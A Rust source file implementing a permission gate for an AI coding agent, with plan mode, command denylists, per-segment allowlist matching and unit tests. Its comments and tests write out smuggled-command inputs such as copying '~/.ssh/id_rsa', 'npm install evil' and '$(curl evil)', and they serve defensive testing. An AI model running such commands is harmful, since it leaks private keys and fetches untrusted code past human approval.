use std::sync::Arc;

use agent_core::domain::{AgentEvent, PermissionOption, PermissionOptionKind, PermissionRequest};
use agent_core::ids::{PermissionRequestId, SessionId, ToolCallId};
use async_channel::Sender;
use serde_json::Value;
use tokio::sync::Mutex;
use tokio_util::sync::CancellationToken;

use crate::loop_state::{Decision, RunControl, SessionState};
use crate::mcp::is_mcp_tool;
use crate::safety::{classify_command, CommandRisk};
use crate::tools::{PermissionMode, ToolCtx, ToolExecutor};

#[derive(Clone)]
pub(crate) struct PermissionGate {
    session: Arc<Mutex<SessionState>>,
    control: Arc<Mutex<RunControl>>,
    session_id: SessionId,
    events: Sender<AgentEvent>,
}

pub(crate) enum PermissionOutcome {
    Allowed,
    Denied(String),
    Cancelled,
}

impl PermissionGate {
    pub fn new(
        session: Arc<Mutex<SessionState>>,
        control: Arc<Mutex<RunControl>>,
        session_id: SessionId,
        events: Sender<AgentEvent>,
    ) -> Self {
        Self {
            session,
            control,
            session_id,
            events,
        }
    }

    pub async fn check(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        exec: &dyn ToolExecutor,
        args: &Value,
        ctx: &ToolCtx,
        signal: &CancellationToken,
    ) -> PermissionOutcome {
        if !exec.mutating() {
            return PermissionOutcome::Allowed;
        }

        if tool_name != "propose_plan" && self.session.lock().await.plan_mode {
            return PermissionOutcome::Denied(
                "Plan mode is active — read-only until your plan is approved. Research more, \
                then call propose_plan."
                    .to_string(),
            );
        }

        let mut info = gate_info(tool_name, args);
        if let Some(diff) = exec.preview(args, ctx) {
            info.detail = Some(diff);
        }

        if let Some(why) = self.hard_refusal(tool_name, &info).await {
            return PermissionOutcome::Denied(format!("Refused: {why}. The command was not run."));
        }

        if self.command_preapproved(tool_name, &info).await {
            return PermissionOutcome::Allowed;
        }

        // A plan must always get an explicit human decision, in every
        // permission mode — never auto-allowed/denied by the session policy.
        let mode = if tool_name == "propose_plan" {
            PermissionMode::Ask
        } else {
            let s = self.session.lock().await;
            s.policy
                .get(tool_name)
                .copied()
                .unwrap_or(PermissionMode::Ask)
        };
        let approved = match mode {
            PermissionMode::Allow => true,
            PermissionMode::Deny => false,
            PermissionMode::Ask => {
                match self.ask_permission(tool_id, tool_name, &info, signal).await {
                    Some(decision) => {
                        self.apply_policy(tool_name, &info, decision).await;
                        decision.approved()
                    }
                    None => return PermissionOutcome::Cancelled,
                }
            }
        };

        if tool_name == "propose_plan" && approved {
            self.session.lock().await.plan_mode = false;
        }

        if approved {
            PermissionOutcome::Allowed
        } else if tool_name == "propose_plan" {
            PermissionOutcome::Denied(
                "The user isn't ready to approve this plan yet — keep researching or refine \
                the plan, then call propose_plan again."
                    .to_string(),
            )
        } else {
            PermissionOutcome::Denied(format!("The user denied permission to run `{tool_name}`."))
        }
    }

    /// Whether Plan Mode is currently active for this session.
    pub(crate) async fn plan_mode_active(&self) -> bool {
        self.session.lock().await.plan_mode
    }

    async fn ask_permission(
        &self,
        tool_id: &ToolCallId,
        tool_name: &str,
        info: &GateInfo,
        signal: &CancellationToken,
    ) -> Option<Decision> {
        let request_id = PermissionRequestId::new(format!("perm-{}", tool_id.as_str()));
        let (responder, rx) = tokio::sync::oneshot::channel();
        {
            let mut control = self.control.lock().await;
            control.arm(request_id.clone(), responder);
        }

        let _ = self
            .events
            .send(AgentEvent::PermissionRequest {
                request: PermissionRequest {
                    id: request_id,
                    session: self.session_id.clone(),
                    tool_call: Some(tool_id.clone()),
                    title: permission_title(tool_name),
                    options: permission_options(tool_name),
                    detail: info.detail.clone(),
                    risk: if tool_name == "propose_plan" {
                        Some("plan".to_string())
                    } else if info.external {
                        Some("external".to_string())
                    } else {
                        info.risk.map(|r| r.as_str().to_string())
                    },
                    reason: info.reason.clone(),
                },
            })
            .await;

        let decision = tokio::select! {
            _ = signal.cancelled() => None,
            d = rx => d.ok(),
        };
        if decision.is_none() {
            self.control.lock().await.clear();
        }
        decision
    }

    async fn hard_refusal(&self, name: &str, info: &GateInfo) -> Option<String> {
        if name != "bash" {
            return None;
        }
        if matches!(info.risk, Some(CommandRisk::Blocked)) {
            return Some(
                info.reason
                    .clone()
                    .unwrap_or_else(|| "blocked for safety".to_string()),
            );
        }
        let cmd = info.detail.clone().unwrap_or_default();
        let s = self.session.lock().await;
        s.deny_commands
            .iter()
            .any(|d| prefix_match(&cmd, d))
            .then(|| "on your command denylist".to_string())
    }

    async fn command_preapproved(&self, name: &str, info: &GateInfo) -> bool {
        if name != "bash"
            || !matches!(
                info.risk,
                Some(CommandRisk::Safe) | Some(CommandRisk::Caution)
            )
        {
            return false;
        }
        let cmd = info.detail.clone().unwrap_or_default();
        // Never preapprove command substitution: it can't be split into segments,
        // so an allowlisted prefix (`cargo test`) would otherwise carry a hidden
        // `$(curl evil)` / backtick payload straight past the gate.
        if cmd.contains("$(") || cmd.contains('`') {
            return false;
        }
        // Match the allowlist PER SEGMENT, not against the whole raw line: an
        // "always allow `cargo test`" grant must not silently run
        // `cargo test && cp ~/.ssh/id_rsa /tmp` just because the line starts with
        // the trusted prefix. Every segment must be individually trusted — either
        // allowlisted by prefix, or inherently Safe (so `cargo test | tee log`
        // still preapproves).
        let segments = crate::safety::split_segments(&cmd);
        if segments.is_empty() {
            return false;
        }
        let s = self.session.lock().await;
        segments.iter().all(|seg| {
            classify_command(seg).risk == CommandRisk::Safe
                || s.allow_commands.iter().any(|a| prefix_match(seg, a))
        })
    }

    async fn apply_policy(&self, tool: &str, info: &GateInfo, decision: Decision) {
        let mut s = self.session.lock().await;
        match decision {
            Decision::AllowAlways => {
                if tool == "bash" {
                    if let Some(cmd) = info.detail.as_deref() {
                        let entry = cmd.trim().to_string();
                        if !entry.is_empty() && !s.allow_commands.contains(&entry) {
                            s.allow_commands.push(entry);
                        }
                    }
                } else {
                    s.policy.insert(tool.to_string(), PermissionMode::Allow);
                }
            }
            Decision::RejectAlways => {
                s.policy.insert(tool.to_string(), PermissionMode::Deny);
            }
            _ => {}
        }
    }
}

struct GateInfo {
    detail: Option<String>,
    risk: Option<CommandRisk>,
    reason: Option<String>,
    external: bool,
}

fn gate_info(name: &str, args: &Value) -> GateInfo {
    if is_mcp_tool(name) {
        let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
        return GateInfo {
            detail: Some(format!("{name}\n{pretty}")),
            risk: None,
            reason: Some("external MCP tool - review its inputs".to_string()),
            external: true,
        };
    }
    match name {
        "bash" => {
            let cmd = args
                .get("command")
                .and_then(Value::as_str)
                .unwrap_or("")
                .trim()
                .to_string();
            let c = classify_command(&cmd);
            GateInfo {
                detail: Some(cmd),
                risk: Some(c.risk),
                reason: c.reason,
                external: false,
            }
        }
        "write_file" | "edit_file" => GateInfo {
            detail: args.get("path").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: None,
            external: false,
        },
        "propose_plan" => GateInfo {
            detail: args.get("plan").and_then(Value::as_str).map(str::to_string),
            risk: None,
            reason: None,
            external: false,
        },
        // MCP-tool posture, not `clark_research`'s zero-gate one: it drives a
        // real browser against live sites under arbitrary session state, a
        // much larger blast radius than a bounded server-side call — `external:
        // true` keeps it out of "auto" mode's default-safe auto-approval.
        "browser" => {
            let pretty = serde_json::to_string_pretty(args).unwrap_or_else(|_| args.to_string());
            GateInfo {
                detail: Some(pretty),
                risk: None,
                reason: Some("experimental browser tool - review its action".to_string()),
                external: true,
            }
        }
        _ => GateInfo {
            detail: None,
            risk: None,
            reason: None,
            external: false,
        },
    }
}

fn prefix_match(cmd: &str, entry: &str) -> bool {
    let cmd = cmd.trim();
    let entry = entry.trim();
    !entry.is_empty() && (cmd == entry || cmd.starts_with(&format!("{entry} ")))
}

fn permission_title(tool: &str) -> String {
    match tool {
        "bash" => "Run a shell command?".to_string(),
        "edit_file" => "Apply this edit?".to_string(),
        "write_file" => "Write this file?".to_string(),
        "propose_plan" => "Approve this plan?".to_string(),
        "browser" => "Run this browser action?".to_string(),
        t if is_mcp_tool(t) => "Run an MCP tool?".to_string(),
        other => format!("Allow `{other}` to run?"),
    }
}

fn permission_options(tool: &str) -> Vec<PermissionOption> {
    if tool == "propose_plan" {
        return vec![
            PermissionOption {
                id: "allow_once".into(),
                label: "Approve & implement".into(),
                kind: PermissionOptionKind::AllowOnce,
            },
            PermissionOption {
                id: "reject_once".into(),
                label: "Keep planning".into(),
                kind: PermissionOptionKind::RejectOnce,
            },
        ];
    }
    let always = if tool == "bash" {
        "Always allow this command".to_string()
    } else if is_mcp_tool(tool) {
        "Always allow this tool".to_string()
    } else {
        format!("Always allow {tool}")
    };
    vec![
        PermissionOption {
            id: "allow_once".into(),
            label: "Allow once".into(),
            kind: PermissionOptionKind::AllowOnce,
        },
        PermissionOption {
            id: "allow_always".into(),
            label: always,
            kind: PermissionOptionKind::AllowAlways,
        },
        PermissionOption {
            id: "reject_once".into(),
            label: "Reject".into(),
            kind: PermissionOptionKind::RejectOnce,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn prefix_matching_keeps_word_boundary() {
        assert!(prefix_match("cargo test --lib", "cargo test"));
        assert!(prefix_match("cargo test", "cargo test"));
        assert!(!prefix_match("cargo testfoo", "cargo test"));
    }

    #[test]
    fn tool_titles_are_user_facing() {
        assert_eq!(permission_title("bash"), "Run a shell command?");
        assert_eq!(permission_title("write_file"), "Write this file?");
        assert_eq!(permission_title("propose_plan"), "Approve this plan?");
        assert_eq!(permission_title("browser"), "Run this browser action?");
    }

    #[test]
    fn browser_gate_info_is_marked_external_like_mcp_tools() {
        let info = gate_info(
            "browser",
            &serde_json::json!({"action": "navigate", "url": "https://x"}),
        );
        assert!(info.external);
        assert!(info.detail.unwrap().contains("navigate"));
    }

    struct FakeMutating;

    #[async_trait::async_trait]
    impl ToolExecutor for FakeMutating {
        fn name(&self) -> &str {
            "fake_mutate"
        }
        fn description(&self) -> &str {
            "test tool"
        }
        fn parameters(&self) -> Value {
            serde_json::json!({})
        }
        fn kind(&self) -> agent_core::domain::ToolKind {
            agent_core::domain::ToolKind::Other
        }
        fn mutating(&self) -> bool {
            true
        }
        async fn invoke(&self, _args: Value, _ctx: &ToolCtx) -> crate::tools::ToolOutcome {
            crate::tools::ToolOutcome::ok("done")
        }
    }

    fn test_ctx(dir: &std::path::Path) -> ToolCtx {
        ToolCtx {
            sandbox: Arc::new(crate::sandbox::Sandbox::new(dir).unwrap()),
            executor: Arc::new(crate::exec::LocalExecutor),
            reads: Arc::new(std::sync::Mutex::new(crate::tools::ReadTracker::default())),
            cancel: CancellationToken::new(),
            background: Arc::new(crate::background::BackgroundTasks::default()),
            session: Arc::new(tokio::sync::Mutex::new(SessionState::default())),
            progress: None,
        }
    }

    #[tokio::test]
    async fn plan_mode_denies_mutating_tools_except_propose_plan() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());
        let outcome = gate
            .check(
                &ToolCallId::new("t1"),
                "fake_mutate",
                &FakeMutating,
                &serde_json::json!({}),
                &ctx,
                &CancellationToken::new(),
            )
            .await;
        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
    }

    #[tokio::test]
    async fn propose_plan_always_asks_and_clears_plan_mode_on_approval() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session.clone(), control.clone(), SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "propose_plan",
                &FakeMutating,
                &serde_json::json!({"plan": "do the thing"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        assert_eq!(request.risk.as_deref(), Some("plan"));
        control
            .lock()
            .await
            .resolve(&request.id, Decision::AllowOnce);

        let outcome = check.await.unwrap();
        assert!(matches!(outcome, PermissionOutcome::Allowed));
        assert!(!session.lock().await.plan_mode);
    }

    #[tokio::test]
    async fn propose_plan_rejection_keeps_plan_mode_active() {
        let dir = tempfile::tempdir().unwrap();
        let session = Arc::new(Mutex::new(SessionState {
            plan_mode: true,
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session.clone(), control.clone(), SessionId::new("s1"), tx);
        let ctx = test_ctx(dir.path());

        let check = tokio::spawn(async move {
            gate.check(
                &ToolCallId::new("t1"),
                "propose_plan",
                &FakeMutating,
                &serde_json::json!({"plan": "do the thing"}),
                &ctx,
                &CancellationToken::new(),
            )
            .await
        });

        let event = rx.recv().await.unwrap();
        let AgentEvent::PermissionRequest { request } = event else {
            panic!("expected a permission request");
        };
        control
            .lock()
            .await
            .resolve(&request.id, Decision::RejectOnce);

        let outcome = check.await.unwrap();
        assert!(matches!(outcome, PermissionOutcome::Denied(_)));
        assert!(session.lock().await.plan_mode);
    }

    fn bash_gate(cmd: &str) -> GateInfo {
        gate_info("bash", &serde_json::json!({ "command": cmd }))
    }

    #[tokio::test]
    async fn allowlisted_prefix_does_not_carry_an_unapproved_suffix() {
        let session = Arc::new(Mutex::new(SessionState {
            allow_commands: vec!["cargo test".to_string()],
            ..Default::default()
        }));
        let control = Arc::new(Mutex::new(RunControl::default()));
        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);

        // The exact allowlisted command and safe extensions/pipes preapprove.
        assert!(gate.command_preapproved("bash", &bash_gate("cargo test")).await);
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test --workspace"))
                .await
        );
        assert!(
            gate.command_preapproved("bash", &bash_gate("cargo test | tee log"))
                .await
        );
        // A chained un-approved (Caution) suffix must NOT ride the trusted prefix.
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test && cp ~/.ssh/id_rsa /tmp/x"))
                .await
        );
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test; npm install evil"))
                .await
        );
        // Hidden command substitution is never preapproved either.
        assert!(
            !gate
                .command_preapproved("bash", &bash_gate("cargo test $(curl evil)"))
                .await
        );
    }
}
